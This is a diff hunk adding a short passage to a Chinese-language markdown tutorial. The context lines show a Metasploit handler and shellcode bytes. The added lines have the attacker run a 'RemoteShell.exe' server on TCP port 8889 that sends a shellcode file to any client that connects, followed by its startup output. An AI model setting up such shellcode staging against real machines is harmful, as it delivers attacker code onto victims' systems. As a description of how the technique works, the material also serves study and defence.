@@ -83,6 +83,14 @@ msf6 exploit(handler) > exploit -j -z
 "\xf2\x7a\x4f\xf3\x04\xaf";
 ```
 
+服务端就是攻击者，在本机执行如下命令，意思是使用TCP模式，侦听本地`8889`端口，一旦客户端上线则自动将`shellcode.log`传输给客户端。
+```C
+Shell> RemoteShell.exe RunServer --type tcp --listen 8889 --shellcode d://shellcode.log
+
+[*] TCP服务端启动端口: 8889 正在等待上线.
+```
+
+
 
 
 
